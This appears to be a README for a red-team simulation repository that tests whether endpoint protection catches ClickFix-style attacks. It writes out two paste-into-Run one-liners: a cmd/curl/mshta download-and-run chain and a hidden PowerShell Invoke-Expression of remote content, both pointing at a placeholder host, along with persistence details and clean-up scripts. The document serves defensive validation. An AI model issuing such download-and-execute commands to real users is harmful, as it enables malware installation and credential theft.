# ClickFix Infection Simulations

## What is ClickFix?

**ClickFix** is a social engineering malware-delivery technique where an attacker tricks a user into manually running a malicious command on their own device. Rather than exploiting a software vulnerability, the attacker displays a fake error message, CAPTCHA, browser issue, or verification prompt and instructs the user to copy, paste, and execute a command (commonly in **PowerShell**, **Command Prompt**, **Terminal**, or the **Run** dialog).

Typical flow:

* User visits a compromised or malicious website (or phishing page).
* A fake error/CAPTCHA/support message appears.
* The page tells the user to copy and run a command to "fix" the issue.
* The command downloads and executes malware such as infostealers, RATs, or ransomware.

Why it's effective:

* The user performs the action themselves, helping bypass some automated security controls.
* It uses legitimate tools already on the system (PowerShell, Terminal, etc.). These are commonly referred to as **Living off the Land Binaries** or **LOLBins**. 
* The prompts often look like routine browser or security verification steps.

Key takeaway: ClickFix is not malware itself. It is a user-manipulation technique used to get victims to execute malware on their own machines.

## The Simulations

These **ClickFix** simulations are benign tests of Endpoint Protection suites. These two infection methods were observed in a production environment, so these tests were developed to help validate detection capabilities of various Endpoint Protection suites.

_**NOTE**: See README files for each simulation for details on modifying the payloads._

### MSHTA Levaging cURL

This method leverages a pasted command that downloads and executes a **Windows HTML Application** or **HTA**. The **HTA** then leverages `cURL` to download and extract a "PDF" file that is actually a TAR archive containing the payload. After extraction, the payload is then executed. 

#### Execution

To execute this test, log into the machine you wish to test your Endpoint Protection suite on. Preferably, use a non-privileged account to more closely simulate a real-world test. Copy the below command to your clipboard, press `WIN+R` to open the "run" prompt, press `CTRL+V` to paste the command, then `ENTER` to execute.

```
cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<mysite.com>/B.max" && mshta "!u!" && del /f "!u!""
```

#### Validation

To validate whether or not the "infection" succeeded, you should find the following files on your system. 

```
%LOCALAPPDATA%\B.max
%USERPROFILE%\Documents\928252966059280400\clickfix-sim-payload.txt
%USERPROFILE%\Documents\928252966059280400\928252966059280400.pdf
%USERPROFILE%\Documents\928252966059280400\Syncovery.exe
```

If found, the "infection" succeeded, and your Endpoint Protection failed to prevent it.

#### Clean-Up

To clean up the "infection" from your computer, simply run this PowerShell command to remove the payload and log files:

```
Remove-Item -LiteralPath "$env:LOCALAPPDATA\B.max" -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath "$env:USERPROFILE\Documents\928252966059280400" -Force -Recurse -ErrorAction SilentlyContinue
```

### PWSH Chain Loader

This method leverages a PowerShell chain loader to install an application to the user's profile, then an HKCU registry entry to start the application on login. Since the "run" command limits the number of characters that may be input, the actual command string is located in a text file `nexus-validation.txt` on the C2 server. These commands are then executed locally on the machine. 

#### Execution

To execute this test, log into the machine you wish to test your Endpoint Protection suite on. Preferably, use a non-privileged account to more closely simulate a real-world test. Copy the below command to your clipboard, press `WIN+R` to open the "run" prompt, press `CTRL+V` to paste the command, then `ENTER` to execute.

```
powershell.exe -NoProfile -WindowStyle hidden -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<mysite.com>/nexus-validation.txt' -UseBasicParsing).Content)"
```

#### Validation

To validate whether or not the "infection" succeeded, you should find the following files on your system.

```
%LOCALAPPDATA%\NexusConnector\NexusConnector.exe
%TEMP%\nexusconnector-loader-validation.log
%TEMP%\nexusconnector-validation.log
```

If found, the "infection" succeeded, and your Endpoint Protection failed to prevent it.

#### Clean-Up

To clean up the "infection" from your computer, simply run these PowerShell commands to stop and remove the payload and log files:

```
# Stop simulated payload if still running
Get-Process -Name NexusConnector -ErrorAction SilentlyContinue | Stop-Process -Force

# Remove HKCU Run persistence
Remove-ItemProperty `
  -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
  -Name 'NexusConnector' `
  -ErrorAction SilentlyContinue

# Remove installed simulated app
Remove-Item `
  -LiteralPath "$env:LOCALAPPDATA\NexusConnector" `
  -Recurse `
  -Force `
  -ErrorAction SilentlyContinue

# Remove validation logs
Remove-Item `
  -LiteralPath "$env:TEMP\nexusconnector-loader-validation.log","$env:TEMP\nexusconnector-validation.log" `
  -Force `
  -ErrorAction SilentlyContinue

# Remove any downloaded launcher script if you tested that method
Remove-Item `
  -LiteralPath "$env:TEMP\nexus-validation.ps1" `
  -Force `
  -ErrorAction SilentlyContinue

# Remove temp staging folders from this validation, identified by nexus_payload.zip
Get-ChildItem -Path $env:TEMP -Directory -ErrorAction SilentlyContinue | ForEach-Object {
    if (Test-Path (Join-Path $_.FullName 'nexus_payload.zip')) {
        Remove-Item -LiteralPath $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
    }
}
```

## Disclaimer

This repository is provided for educational, research, testing, and defensive security purposes only. The code contained herein is intended to simulate infection techniques observed in real-world environments to assist with security analysis, detection engineering, threat hunting, and incident response activities.

By accessing, downloading, or using any code in this repository, you acknowledge that you do so entirely at your own risk. The repository owner and contributors make no warranties, express or implied, regarding the safety, suitability, reliability, or fitness of the code for any purpose.

Users are solely responsible for ensuring their use of this repository complies with all applicable laws, regulations, policies, and contractual obligations. Any use of the code for unauthorized, malicious, illegal, or unethical activities is strictly prohibited.

The repository owner and contributors assume no responsibility or liability for any direct, indirect, incidental, consequential, or other damages resulting from the use, misuse, modification, distribution, or execution of any code contained in this repository.
